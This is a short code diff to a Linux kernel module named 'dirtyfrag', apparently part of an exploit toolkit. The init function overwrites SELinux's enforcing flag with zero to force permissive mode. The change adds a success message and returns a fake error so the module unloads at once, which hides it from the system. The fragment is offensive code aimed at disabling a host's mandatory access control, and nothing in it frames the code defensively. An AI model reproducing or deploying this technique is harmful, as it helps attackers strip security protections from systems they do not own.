@@ -86,7 +86,9 @@ static int __init dirtyfrag_init(void)
 	/* struct selinux_state.enforcing is the first field; one NUL byte. */
 	*(volatile unsigned char *)sstate = 0;
 
-	return 0;
+	pr_info("dirtyfrag: Successfully set selinux permissive.\n");
+    /* Return random error to unload module. */
+	return -E2BIG;
 }
 
 /* No module_exit: we never unload; saves .exit sections. */
